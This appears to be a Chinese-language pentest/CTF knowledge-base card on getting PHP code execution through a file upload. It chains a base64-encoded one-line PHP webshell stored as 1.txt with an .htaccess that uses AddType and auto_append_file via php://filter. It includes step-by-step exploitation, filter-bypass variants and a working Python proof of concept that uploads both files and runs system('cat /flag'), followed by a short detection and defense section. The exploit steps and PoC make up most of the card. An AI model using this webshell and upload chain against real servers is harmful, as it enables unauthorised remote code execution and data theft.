---
id: web-generic-file-upload-htaccess-auto-append-php-filter-base64
title: .htaccess auto_append_file + php://filter base64-decode：上传纯文本实现 PHP 代码执行
type: scenario
domain: web
path: web/generic/file-upload
technique: htaccess-auto-append-php-filter-base64
aliases:
- htaccess auto_append_file
- php://filter base64-decode
- 上传 base64 一句话
- AddType application/x-httpd-php
- uploadfile
tags:
- web
- file-upload
- apache
- htaccess
- php
- php-filter
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-06'
verification:
  verified_by: verifier-V113
  verified_at: '2026-11-06T02:00:07+08:00'
  notes: 已对照原文uploadfile段核对：.php与内容过滤、可传.htaccess、base64一句话、AddType application/x-httpd-php .txt与php_value auto_append_file php://filter/convert.base64-decode/resource=1.txt、ls /回显及最终flag均一致。未验证点：PoC未本机复跑，原文只写“即可”、未给上传响应细节；frontmatter无sources/source_url。
---

## 一句话结论

当上传接口对后缀和文件内容做检测、但允许上传 `.htaccess` 时，可以上传一个 base64 编码的一句话木马 `1.txt`（内容不含 `<?php` 明文），再上传 `.htaccess`：`AddType application/x-httpd-php .txt` 让 `.txt` 可被 PHP 解析，`php_value auto_append_file php://filter/convert.base64-decode/resource=1.txt` 让每个 PHP 请求自动包含并 base64 解码执行该文件。

## 原理

- **.htaccess 的 PHP 指令**：Apache + mod_php 下，`.htaccess` 可设置 `AddType`（把 `.txt` 映射到 PHP handler）与 `php_value auto_append_file`（每个 PHP 脚本执行后自动包含指定文件）。
- **php://filter 流包装器**：`php://filter/convert.base64-decode/resource=1.txt` 会先对 `1.txt` 的内容做 base64 解码，再把结果作为 PHP 代码包含；因此 `1.txt` 可以只放 base64 字符串（如 `PD9waHAgZXZhbCgkX1BPU1RbMF0pOz8+`），不含 `<?php`/`eval` 明文，绕过内容检测。
- **AddType 与 auto_append_file 的分工**：`AddType` 让 `.txt` 文件本身被当作 PHP 处理（若直接访问）；`auto_append_file` 则让目录下任意 PHP 页面自动包含并执行解码后的代码，二者组合提高命中率。
- **为什么能执行**：PHP 对 `auto_append_file` 的值按流包装器解析，`php://filter` 在包含时生效；base64 解码后的 `<?php ... ?>` 被当作代码编译执行。
- **边界**：需要 Apache + mod_php（`.htaccess` 生效）、`AllowOverride` 允许 `FileInfo`/`Options`；PHP-FPM/Nginx 下 `.htaccess` 不生效，应改用 `.user.ini` + `auto_prepend_file`。

## 触发条件

- 上传接口允许 `.htaccess`（或可重命名落盘为 `.htaccess`），且对 `.php` 后缀/内容做过滤。
- Apache + mod_php，目标目录 `AllowOverride` 允许 `FileInfo`/`Options`，`php_value` 生效。
- 同目录存在可访问的 PHP 脚本以触发 `auto_append_file`（也可直接访问 `1.txt`，若 AddType 生效）。
- 能上传第二个文件 `1.txt` 作为 base64 payload；PHP 进程可读。

## 利用步骤

1. 生成 base64 一句话：`PD9waHAgZXZhbCgkX1BPU1RbMF0pOz8+`（`<?php eval($_POST[0]);?>`）。
2. 上传 `1.txt`，内容仅 base64 字符串；上传 `.htaccess`，内容：
   ```apache
   AddType application/x-httpd-php .txt
   php_value auto_append_file php://filter/convert.base64-decode/resource=1.txt
   ```
3. 访问同目录任意 PHP 页面（或 `/1.txt`，若 AddType 生效），触发自动包含；`php://filter` 解码并执行木马。
4. 用 POST 参数 `0=system('cat /flag');` 执行命令，读取回显。
5. 若 `.htaccess` 被过滤，尝试 `php_value auto_append_fi\` 续行、`AddType` 大小写、`.htaccess` 别名/编码；若 PHP-FPM，改用 `.user.ini`。

## PoC

```python
import base64
import requests

BASE = "http://target:8090"
payload = "<?php eval($_POST[0]);?>"
b64 = base64.b64encode(payload.encode()).decode()
print(b64)  # PD9waHAgZXZhbCgkX1BPU1RbMF0pOz8+

s = requests.Session()
s.post(BASE + "/upload.php", files={"file": ("1.txt", b64, "text/plain")})
htaccess = (
    "AddType application/x-httpd-php .txt\n"
    "php_value auto_append_file php://filter/convert.base64-decode/resource=1.txt\n"
)
s.post(BASE + "/upload.php", files={"file": (".htaccess", htaccess, "text/plain")})

r = s.post(BASE + "/1.txt", data={"0": "system('cat /flag');"})
print(r.text)
```

## 变体与关联

- **变体（PHP-FPM）**：`.user.ini` + `auto_prepend_file=1.txt` + `short_open_tag=On`；见 [[web-php-file-inclusion-user-ini-auto-prepend-rce]]。
- **变体（自包含）**：`php_value auto_append_file .htaccess` 让 `.htaccess` 自身被包含；见 [[web-php-file-inclusion-htaccess-self-include-dirty-bypass]]。
- **变体（handler 覆盖）**：`SetHandler application/x-httpd-php`/`AddType` 解析图片后缀；见 [[web-generic-file-upload-htaccess-handler-override]]。
- **变体（内容过滤）**：base64/rot13/十六进制 + `php://filter` 链；`convert.base64-decode` 可换 `convert.iconv.*`/`zlib.inflate`。
- **关联卡片**：[[web-php-rce-htaccess-cgi-addhandler-bypass-disable-functions]]（CGI/AddHandler）、[[web-generic-file-upload-htaccess-handler-override]]（后缀解析）。
- **边界**：Nginx/PHP-FPM 下 `.htaccess` 无效；`AllowOverride None` 时配置不生效；`php_value` 需要 mod_php；上传目录不可执行时需换包含点。

## 检测与防御

- **上传限制**：禁止上传 `.htaccess`/`.user.ini`；对文件名/后缀/内容做白名单；上传目录禁止 PHP 解析（`php_admin_flag engine off`）。
- **Apache 配置**：`AllowOverride None`；禁止 `php_value`/`AddType` 覆盖；上传目录单独配置无 handler。
- **WAF/检测**：扫描 `.htaccess` 中的 `auto_append_file`/`AddType`/`php_value`；监控 `php://filter` 参数；限制 base64 长文本上传。
- **架构**：上传文件放对象存储/独立域名，不与应用同目录；使用 PHP-FPM + Nginx 时明确禁止 `.htaccess`。
